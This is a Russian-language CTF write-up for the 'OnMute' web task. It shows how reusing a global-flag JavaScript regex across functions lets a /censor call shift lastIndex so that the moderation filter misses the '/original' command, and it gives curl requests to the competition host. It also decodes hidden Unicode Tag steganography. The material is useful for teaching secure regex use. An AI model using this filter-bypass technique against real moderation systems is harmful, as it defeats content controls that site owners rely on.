# OnMute — write-up (task5)

**Avito CTF 2026 · категория «Web / анализ исходников»**

## 1. Условие задачи

OnMute — музыкальная площадка, где тексты треков показываются **зацензуренными**. Нужно обойти
цензуру и достать полный (оригинальный) текст. Флаг спрятан в оригинале одного из треков.

**Дано:** `onmute_a003aa0.zip` — исходники (Node/Express + Redis сервер, React-клиент).
**Боевой хост:** `https://onmute-xtegmx4v.avitoctf.ru/`

## 2. Разведка

Раз даны исходники — читаем серверную логику `server/src/` и ищем, где вообще живёт оригинальный
текст и как он отдаётся наружу.

**Где хранятся тексты.** В `seed.js` у каждого трека два поля — `censored` и `original`. Публичное
API (`models/tracks.js`) наружу отдаёт **только цензуру**: `listTracks`/`getTrack` возвращают
`text: censored`. Есть функция `getOriginalText(id)` (возвращает `original`), но напрямую в HTTP-роут
она не подключена.

**Единственная дверь к оригиналу — чат-бот под треком.** `POST /api/tracks/:id/comment` с `{text}`
парсит команды (`bot/commands.js`). Среди команд есть:

```
/original <track_id>  — показать оригинальный текст без цензуры
```

Обработчик `case 'original'` дёргает `getOriginalText` и возвращает оригинал. Вот наша цель.

**Почему в лоб не выйдет.** Перед выполнением команды комментарий проходит модерацию, а `/original`
стоит **первым** в блоклисте (`moderation/blocklist.js`):

```js
export const BLOCKED_WORDS = [
  '/original',
  'блин', 'чёрт', ... 'массаж', 'тише', 'тёплый', 'лениво', ...
];
```

Значит `/original 4` в лоб отобьётся как «запрещённое слово». Надо понять, как устроен фильтр —
и найти в нём щель.

## 3. Уязвимость: stateful-регексп с флагом `g` (десинхрон `lastIndex`)

Вся модерация (`moderation/filter.js`) построена на **одном объекте `RegExp`, закэшированном на сессию**
в `Map policies`:

```js
re: new RegExp(`(?:${BLOCKED_WORDS.join('|')})(?=[\\s.,!?;:)}\\]"'»]|$)`, 'gi')
```

Один и тот же объект `re` используют **две** функции:

- `checkContent(text)` — сканирует комментарий циклом `while ((m = re.exec(text)) !== null)`. Когда
  `exec` совпадений больше не находит, он возвращает `null` и **сам сбрасывает `re.lastIndex` в 0** —
  поэтому изолированно `checkContent` консистентен.
- `matchesPolicy(fragment)` — вызывается из обработчика `/censor` и делает `re.test(fragment)`.
  У регекспа с флагом `g` метод `.test()` при **совпадении** сдвигает `re.lastIndex` на конец
  найденного слова и **НЕ сбрасывает** его.

**Корень бага.** После вызова `/censor`, чей фрагмент совпал с запрещённым словом, у сессионного
регекспа остаётся `lastIndex > 0`. Следующий `checkContent('/original 4')` начинает `re.exec`
**не с нуля, а с этого `lastIndex`**, поэтому **проскакивает `/original` в начале строки**. Других
запрещённых слов в хвосте (`"nal 4"`) нет → `exec` сразу вернёт `null`, `blocked = false`. Фильтр
ослеп — управление уходит в `parseCommand('/original 4')`, команда выполняется, бот отдаёт оригинал.

Детали, делающие баг реальным:
- Регексп кэшируется **на сессию** (`policies.get(sessionId)`), а сессия стабильна по httpOnly-куке
  `onmute_sid` (`middleware/session.js`) — состояние `lastIndex` переживает запросы.
- `/censor` сам фильтр проходит: в тексте `"/censor 617 623"` запрещённых слов нет. А `matchesPolicy`
  внутри `/censor` проверяет уже **вырезанный фрагмент трека** — вот туда мы и подсовываем
  запрещённое слово, чтобы сдвинуть `lastIndex`.
- Порядок и одна сессия критичны: между праймингом и `/original` не должно быть других запросов,
  иначе чужой `checkContent` сбросит `lastIndex` обратно в 0.

## 4. Эксплуатация шаг за шагом

Всё делается в рамках **одной сессии**, двумя запросами подряд с одной кукой `onmute_sid`.

### Шаг 1. Прайминг `lastIndex` через `/censor` на запрещённом слове

Нужен фрагмент цензуры, точно совпадающий с блоклистом. В цензуре трека №1 слово `массаж` стоит
на позициях `617..623` (следующий символ — запятая, она есть в lookahead-разделителе):

```
POST /api/tracks/1/comment
{"text": "/censor 617 623"}
```

Внутри: `fragment = "массаж"` → `matchesPolicy` → `re.test("массаж")` = `true` →
`re.lastIndex = 6` (запоминается на сессии).

### Шаг 2. Обход фильтра и чтение оригинала

Тем же кукисом сразу следом:

```
POST /api/tracks/4/comment
{"text": "/original 4"}
```

`checkContent` стартует с `lastIndex = 6`, проскакивает `/original`, `blocked = false` → выполняется
команда `/original 4` → бот возвращает оригинальный текст трека №4 с `🚩 avito{...}`.

> Аргумент трека берётся из самой команды (`cmd.trackId`), а не из URL, поэтому `/original 4` можно
> слать на эндпоинт любого трека. Важен лишь порядок: сначала `/censor` (прайминг), сразу затем
> `/original 4`, без запросов между ними.

### Пример (curl)

```bash
# 1) получить сессию + прайминг lastIndex через /censor на запрещённом слове
curl -s -c jar https://onmute-xtegmx4v.avitoctf.ru/api/tracks/1/comment \
  -H 'Content-Type: application/json' -d '{"text":"/censor 617 623"}'

# 2) тем же кукисом — обойти фильтр и прочитать оригинал трека 4
curl -s -b jar https://onmute-xtegmx4v.avitoctf.ru/api/tracks/4/comment \
  -H 'Content-Type: application/json' -d '{"text":"/original 4"}'
# -> в message придёт полный текст с 🚩 avito{...}
```

## 5. Флаг

Флаг лежит в **оригинальном** (нецензурированном) тексте трека №4 «Свожу куски к ключам»:

```
...Забираю своё. Вот он - ключ. Вот он - флаг:
🚩 avito{...}
```

В исходниках (`seed.js`) значение вырезано как `avito{/*REDACTED*/}` — **реальный флаг отдаёт только
боевой сервер** по команде `/original 4` (эксплойт выше). Инвентить его нельзя, поэтому здесь он
показан как `avito{...}`.

### Бонус: скрытая «отсылка для своих» (Unicode Tag стего)

В `original` трека №4 сразу после 🚩 идёт цепочка **невидимых Unicode-символов** из блока Tags
(кодпоинты `U+E01xx`). Та же цепочка вшита в ответ бота на заблокированный комментарий
(`routes/comments.js`, строка с `⛔…`). Это «отсылка для своих», которую «тоже вырезали».

Декодирование: каждый символ — ASCII со смещением `0xE00F0`:

```python
msg = ''.join(chr(ord(c) - 0xE00F0) for c in text if 0xE0100 <= ord(c) <= 0xE01FF)
```

Результат (проверено на `seed.js`):

```
good job, take your hidden flag: https://mutedgift-9oevcdih.avitoctf.ru/
```

То есть скрытое послание указывает на бонус-URL `https://mutedgift-9oevcdih.avitoctf.ru/`.

## 6. Выводы / уроки

- **Читай исходники «от секрета к выходу».** Оригинал есть только у одной команды бота (`/original`),
  которая в лоб заблокирована — это сразу сузило задачу до «как обойти именно фильтр».
- **Регекспы с флагом `g`/`y` хранят состояние (`lastIndex`).** Переиспользовать один такой объект
  для разных строк и разных функций (`exec`-скан и `test`-проверка) нельзя: одно совпадение сдвигает
  указатель и «ослепляет» следующую проверку. Правильно — компилировать регексп заново на каждый
  вызов либо сбрасывать `re.lastIndex = 0` перед проверкой, и не смешивать `test`/`exec` на общем объекте.
- **Состояние, привязанное к сессии, атакуемо между запросами.** Кэш `policies` по `sessionId` +
  стабильная кука превратили «эфемерный» `lastIndex` в межзапросный примитив.
- **Невидимые Unicode-Tag символы — реальный стего-канал.** Стоит проверять «пустые» участки текста
  на кодпоинты `U+E0000…U+E01FF`.
